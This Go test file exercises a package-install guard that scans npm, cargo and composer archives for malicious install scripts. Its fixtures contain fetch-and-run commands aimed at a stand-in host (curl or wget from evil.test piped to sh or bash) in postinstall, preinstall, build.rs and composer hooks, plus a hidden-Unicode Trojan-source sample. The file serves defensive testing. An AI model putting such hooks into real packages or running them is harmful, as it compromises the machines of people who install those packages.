package cli

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"crypto/sha512"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// makeTGZ builds an in-memory gzip+tar archive from path->contents, mimicking
// the npm/pypi convention of nesting everything under a top-level dir.
func makeTGZ(t *testing.T, files map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)
	for name, body := range files {
		if err := tw.WriteHeader(&tar.Header{
			Name: name, Mode: 0o644, Size: int64(len(body)), Typeflag: tar.TypeReg,
		}); err != nil {
			t.Fatalf("tar header %s: %v", name, err)
		}
		if _, err := tw.Write([]byte(body)); err != nil {
			t.Fatalf("tar write %s: %v", name, err)
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatalf("tar close: %v", err)
	}
	if err := gz.Close(); err != nil {
		t.Fatalf("gzip close: %v", err)
	}
	return buf.Bytes()
}

func TestAnalyzeArtifact_NPMRemoteFetchInstallScript(t *testing.T) {
	tgz := makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"evil","version":"1.0.0","scripts":{"postinstall":"curl https://evil.test/x.sh | sh"}}`,
	})
	v := analyzeArtifact("npm", tgz)
	if !v.Block {
		t.Fatalf("expected BLOCK for remote-fetch postinstall, got %+v", v)
	}
	if v.Severity != "behavioral-high" {
		t.Errorf("severity = %q, want behavioral-high", v.Severity)
	}
	if !strings.Contains(v.Reason, "remote") {
		t.Errorf("reason = %q, want it to mention remote", v.Reason)
	}
}

func TestAnalyzeArtifact_NPMClean(t *testing.T) {
	tgz := makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"fine","version":"1.0.0","scripts":{"test":"jest"}}`,
		"package/index.js":     "module.exports = 1;\n",
	})
	if v := analyzeArtifact("npm", tgz); v.Block {
		t.Fatalf("clean package must not block, got %+v", v)
	}
}

func TestAnalyzeArtifact_NPMReferencedDependencyMutationWarns(t *testing.T) {
	tgz := makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"html-to-gutenberg","version":"4.2.10","scripts":{"postinstall":"node ./scripts/patch-fetch-page-assets.mjs"}}`,
		"package/scripts/patch-fetch-page-assets.mjs": `
import fs from "fs";
import path from "path";

const projectRoot = process.cwd();
const sourcePath = path.join(projectRoot, "vendor", "fetch-page-assets", "index.js");
const targetPath = path.join(projectRoot, "node_modules", "fetch-page-assets", "index.js");
fs.copyFileSync(sourcePath, targetPath);
`,
	})
	v := analyzeArtifact("npm", tgz)
	if v.Block {
		t.Fatalf("dependency mutation should warn, not block: %+v", v)
	}
	if v.Severity != "behavioral-medium" {
		t.Fatalf("severity = %q, want behavioral-medium (verdict=%+v)", v.Severity, v)
	}
	if !strings.Contains(v.Reason, "node_modules") {
		t.Fatalf("reason = %q, want node_modules context", v.Reason)
	}
}

func TestAnalyzeArtifact_NPMInlineDependencyMutationWarns(t *testing.T) {
	tgz := makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"patchy","version":"1.0.0","scripts":{"postinstall":"mv ./node_modules/fetch-page-assets/index.ts ./node_modules/fetch-page-assets/index.ts.bak || true"}}`,
	})
	v := analyzeArtifact("npm", tgz)
	if v.Block {
		t.Fatalf("inline dependency mutation should warn, not block: %+v", v)
	}
	if v.Severity != "behavioral-medium" {
		t.Fatalf("severity = %q, want behavioral-medium (verdict=%+v)", v.Severity, v)
	}
}

func TestAnalyzeArtifact_HiddenUnicode(t *testing.T) {
	// U+202E RIGHT-TO-LEFT OVERRIDE embedded in JS source — a Trojan-source style payload.
	tgz := makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"sneaky","version":"1.0.0"}`,
		"package/index.js":     "const ok = true;‮ // flip\n",
	})
	v := analyzeArtifact("npm", tgz)
	if !v.Block {
		t.Fatalf("expected BLOCK for hidden-unicode payload, got %+v", v)
	}
	if !strings.Contains(v.Reason, "hidden-unicode") {
		t.Errorf("reason = %q, want it to mention hidden-unicode", v.Reason)
	}
}

func TestAnalyzeArtifact_GarbageFailsOpen(t *testing.T) {
	for _, in := range [][]byte{nil, {}, []byte("not an archive at all"), {0x1f, 0x8b, 0x00}} {
		if v := analyzeArtifact("npm", in); v.Block {
			t.Fatalf("garbage input must not block (got %+v) — fail-open invariant", v)
		}
	}
}

func TestLocalArtifactBytes(t *testing.T) {
	dir := t.TempDir()
	if err := os.MkdirAll(filepath.Join(dir, "npm"), 0o755); err != nil {
		t.Fatal(err)
	}
	want := []byte("tarball-bytes")
	if err := os.WriteFile(filepath.Join(dir, "npm", "evil-1.0.0.tgz"), want, 0o644); err != nil {
		t.Fatal(err)
	}

	// Unset env -> nil (fail-open, behavioral analysis off).
	t.Setenv(guardArtifactDirEnv, "")
	if b := localArtifactBytes(packageSpec{Ecosystem: "npm", Name: "evil", Version: "1.0.0"}); b != nil {
		t.Fatalf("unset dir must return nil, got %d bytes", len(b))
	}

	t.Setenv(guardArtifactDirEnv, dir)
	if b := localArtifactBytes(packageSpec{Ecosystem: "npm", Name: "evil", Version: "1.0.0"}); !bytes.Equal(b, want) {
		t.Fatalf("pinned lookup = %q, want %q", b, want)
	}
	// Missing package -> nil.
	if b := localArtifactBytes(packageSpec{Ecosystem: "npm", Name: "absent", Version: "9.9.9"}); b != nil {
		t.Fatalf("missing artifact must return nil, got %d bytes", len(b))
	}
}

// TestLocalArtifactBytes_EcosystemAliases pins that a staged artifact resolves
// even when the operator uses the registry directory name (pypi, gem, crates)
// instead of the guard's ecosystem verb (pip, rubygems, cargo). Without the
// alias the byte scan silently no-ops — the footgun this guards against.
func TestLocalArtifactBytes_EcosystemAliases(t *testing.T) {
	want := []byte("staged")
	cases := []struct {
		eco, dirName string // spec ecosystem (guard verb) vs the subdir the operator used
	}{
		{"pip", "pypi"},
		{"rubygems", "gem"},
		{"cargo", "crates"},
		{"go", "gomod"},
	}
	for _, tc := range cases {
		t.Run(tc.eco+"_staged_as_"+tc.dirName, func(t *testing.T) {
			dir := t.TempDir()
			if err := os.MkdirAll(filepath.Join(dir, tc.dirName), 0o755); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(filepath.Join(dir, tc.dirName, "evil-1.0.0.tgz"), want, 0o644); err != nil {
				t.Fatal(err)
			}
			t.Setenv(guardArtifactDirEnv, dir)
			if b := localArtifactBytes(packageSpec{Ecosystem: tc.eco, Name: "evil", Version: "1.0.0"}); !bytes.Equal(b, want) {
				t.Fatalf("eco %q staged under %q/ = %q, want %q (alias lookup failed)", tc.eco, tc.dirName, b, want)
			}
		})
	}
}

func TestAnalyzeArtifact_CargoBuildRsRemoteFetch(t *testing.T) {
	// A .crate nests files under <name>-<version>/. A build.rs that shells out
	// to curl is the rustdecimal-class attack — Aikido's feed is near-empty here.
	crate := makeTGZ(t, map[string]string{
		"evil-1.0.0/Cargo.toml": "[package]\nname = \"evil\"\nversion = \"1.0.0\"\nbuild = \"build.rs\"\n",
		"evil-1.0.0/build.rs":   "fn main() { std::process::Command::new(\"sh\").arg(\"-c\").arg(\"curl https://evil.test/x.sh | sh\").status().unwrap(); }\n",
	})
	v := analyzeArtifact("cargo", crate)
	if !v.Block {
		t.Fatalf("expected BLOCK for build.rs that fetches remote code, got %+v", v)
	}
	if v.Severity != "behavioral-high" {
		t.Errorf("severity = %q, want behavioral-high", v.Severity)
	}
}

func TestAnalyzeArtifact_ComposerRemoteFetchInstallScript(t *testing.T) {
	// A composer.json whose post-install-cmd shells out to curl is the
	// PHP/Composer flavour of the remote-fetch install-script attack.
	tgz := makeTGZ(t, map[string]string{
		"composer.json": `{"name":"evil/pkg","scripts":{"post-install-cmd":["curl https://evil.test/x.sh | sh"]}}`,
	})
	v := analyzeArtifact("composer", tgz)
	if !v.Block {
		t.Fatalf("expected BLOCK for composer post-install-cmd that fetches remote code, got %+v", v)
	}
	if v.Severity != "behavioral-high" {
		t.Errorf("severity = %q, want behavioral-high", v.Severity)
	}
	if !strings.Contains(v.Reason, "remote") {
		t.Errorf("reason = %q, want it to mention remote", v.Reason)
	}
	// The "php" alias resolves to the same detector.
	if v := analyzeArtifact("php", tgz); !v.Block {
		t.Errorf("php alias must block the same composer payload, got %+v", v)
	}
}

func TestAnalyzeArtifact_ComposerClean(t *testing.T) {
	tgz := makeTGZ(t, map[string]string{
		"composer.json": `{"name":"fine/pkg","scripts":{"post-install-cmd":["phpunit"]}}`,
	})
	if v := analyzeArtifact("composer", tgz); v.Block {
		t.Fatalf("clean composer package must not block, got %+v", v)
	}
}

func TestFetchArtifactBytes_FailsOpenOnServerError(t *testing.T) {
	// Deep mode on, but the registry returns 500: fetchArtifactBytes must yield
	// nil so the install proceeds (fail-open) — a guard that breaks installs on a
	// flaky registry gets uninstalled.
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Error(w, "boom", http.StatusInternalServerError)
	}))
	t.Setenv("CHAINSAW_CONFIG_HOME", t.TempDir()) // isolate the egress-audit write
	t.Setenv(guardDeepFetchEnv, "1")
	t.Setenv(guardNpmRegistryEnv, srv.URL)
	spec := packageSpec{Ecosystem: "npm", Name: "net-evil", Version: "4.0.0"}
	if b := fetchArtifactBytes(spec); b != nil {
		srv.Close()
		t.Fatalf("a 500 from the registry must fail open (nil), got %d bytes", len(b))
	}

	// And a dead server (connection refused) must also fail open, not error out.
	srv.Close()
	if b := fetchArtifactBytes(spec); b != nil {
		t.Fatalf("a closed/unreachable server must fail open (nil), got %d bytes", len(b))
	}
}

func TestAnalyzeArtifact_CargoClean(t *testing.T) {
	crate := makeTGZ(t, map[string]string{
		"fine-1.0.0/Cargo.toml": "[package]\nname = \"fine\"\nversion = \"1.0.0\"\n",
		"fine-1.0.0/src/lib.rs": "pub fn ok() -> bool { true }\n",
	})
	if v := analyzeArtifact("cargo", crate); v.Block {
		t.Fatalf("clean crate must not block, got %+v", v)
	}
}

// writeNpmCache stages a tarball into a fake npm cacache the way npm would,
// returning the cache root to point npm_config_cache at.
func writeNpmCache(t *testing.T, name, version string, tarball []byte) string {
	t.Helper()
	root := t.TempDir()
	cacache := filepath.Join(root, "_cacache")
	// Content-addressed store: content-v2/sha512/<2>/<2>/<rest>.
	sum := sha512.Sum512(tarball)
	h := hex.EncodeToString(sum[:])
	contentDir := filepath.Join(cacache, "content-v2", "sha512", h[0:2], h[2:4])
	if err := os.MkdirAll(contentDir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(contentDir, h[4:]), tarball, 0o644); err != nil {
		t.Fatal(err)
	}
	// Index entry: "<digest>\t<json>" with the tarball-URL key + integrity.
	integrity := "sha512-" + base64.StdEncoding.EncodeToString(sum[:])
	key := fmt.Sprintf("make-fetch-happen:request-cache:https://registry.npmjs.org/%s/-/%s-%s.tgz", name, name, version)
	idxDir := filepath.Join(cacache, "index-v5", "aa", "bb")
	if err := os.MkdirAll(idxDir, 0o755); err != nil {
		t.Fatal(err)
	}
	line := fmt.Sprintf("deadbeef\t{\"key\":%q,\"integrity\":%q}\n", key, integrity)
	if err := os.WriteFile(filepath.Join(idxDir, "entry"), []byte(line), 0o644); err != nil {
		t.Fatal(err)
	}
	return root
}

func TestNpmCacheArtifactBytes(t *testing.T) {
	tgz := makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"cached-evil","version":"3.0.0","scripts":{"postinstall":"curl https://evil.test/x | sh"}}`,
	})
	root := writeNpmCache(t, "cached-evil", "3.0.0", tgz)
	t.Setenv("npm_config_cache", root)
	t.Setenv(guardArtifactDirEnv, "") // force the cache path, not the staged dir

	got := npmCacheArtifactBytes(packageSpec{Ecosystem: "npm", Name: "cached-evil", Version: "3.0.0"})
	if !bytes.Equal(got, tgz) {
		t.Fatalf("npm cache read returned %d bytes, want the staged %d", len(got), len(tgz))
	}
	// Unpinned or missing -> nil (fail-open).
	if b := npmCacheArtifactBytes(packageSpec{Ecosystem: "npm", Name: "cached-evil"}); b != nil {
		t.Errorf("unpinned spec must not resolve from cache, got %d bytes", len(b))
	}
	// And the guard blocks it end-to-end via the cache, no staging dir.
	g := newLocalGuard()
	v := g.evaluate(context.Background(), packageSpec{Ecosystem: "npm", Name: "cached-evil", Version: "3.0.0"})
	if !v.Block {
		t.Fatalf("guard must block a cached malicious package with no staging dir, got %+v", v)
	}
}

func TestFetchArtifactBytes_DeepMode(t *testing.T) {
	tgz := makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"net-evil","version":"4.0.0","scripts":{"postinstall":"curl https://evil.test/x | sh"}}`,
	})
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/net-evil/-/net-evil-4.0.0.tgz" {
			http.NotFound(w, r)
			return
		}
		_, _ = w.Write(tgz)
	}))
	defer srv.Close()
	t.Setenv("CHAINSAW_CONFIG_HOME", t.TempDir()) // isolate the egress-audit write
	t.Setenv(guardNpmRegistryEnv, srv.URL)
	spec := packageSpec{Ecosystem: "npm", Name: "net-evil", Version: "4.0.0"}

	// Off by default: no network, no bytes — the offline guarantee holds.
	t.Setenv(guardDeepFetchEnv, "")
	if b := fetchArtifactBytes(spec); b != nil {
		t.Fatalf("deep mode off must return nil (offline), got %d bytes", len(b))
	}

	// On: fetches the pinned tarball and the analyzer blocks it.
	t.Setenv(guardDeepFetchEnv, "1")
	got := fetchArtifactBytes(spec)
	if !bytes.Equal(got, tgz) {
		t.Fatalf("deep fetch returned %d bytes, want %d", len(got), len(tgz))
	}
	if v := analyzeArtifact("npm", got); !v.Block {
		t.Fatalf("fetched malware must block, got %+v", v)
	}
	// Unpinned never fetches (URL not deterministic).
	if b := fetchArtifactBytes(packageSpec{Ecosystem: "npm", Name: "net-evil"}); b != nil {
		t.Fatalf("unpinned spec must not fetch, got %d bytes", len(b))
	}
}

func TestEvaluate_DeepFetchBlock_Integration(t *testing.T) {
	tgz := makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"deep-evil","version":"1.0.0","scripts":{"preinstall":"wget http://evil.test/d -O- | bash"}}`,
	})
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/deep-evil/-/deep-evil-1.0.0.tgz" {
			http.NotFound(w, r)
			return
		}
		_, _ = w.Write(tgz)
	}))
	defer srv.Close()
	t.Setenv("CHAINSAW_CONFIG_HOME", t.TempDir()) // isolate the egress-audit write
	t.Setenv(guardDeepFetchEnv, "1")
	t.Setenv(guardNpmRegistryEnv, srv.URL)
	t.Setenv(guardArtifactDirEnv, "")         // no staged dir
	t.Setenv("npm_config_cache", t.TempDir()) // empty cache -> miss fast, force the fetch

	g := newLocalGuard()
	v := g.evaluate(context.Background(), packageSpec{Ecosystem: "npm", Name: "deep-evil", Version: "1.0.0"})
	if !v.Block {
		t.Fatalf("deep mode must block a fetched malicious package, got %+v", v)
	}
	if v.Severity != "behavioral-high" {
		t.Errorf("severity = %q, want behavioral-high", v.Severity)
	}
}

func TestEvaluate_BehavioralBlock_Integration(t *testing.T) {
	dir := t.TempDir()
	if err := os.MkdirAll(filepath.Join(dir, "npm"), 0o755); err != nil {
		t.Fatal(err)
	}
	tgz := makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"evil","version":"2.0.0","scripts":{"preinstall":"wget http://evil.test/dropper -O- | bash"}}`,
	})
	if err := os.WriteFile(filepath.Join(dir, "npm", "evil-2.0.0.tgz"), tgz, 0o644); err != nil {
		t.Fatal(err)
	}
	t.Setenv(guardArtifactDirEnv, dir)

	g := newLocalGuard()
	v := g.evaluate(context.Background(), packageSpec{Ecosystem: "npm", Name: "evil", Version: "2.0.0"})
	if !v.Block {
		t.Fatalf("guard must BLOCK a staged package with a remote-fetch install script, got %+v", v)
	}
	if v.Severity != "behavioral-high" {
		t.Errorf("severity = %q, want behavioral-high", v.Severity)
	}
}
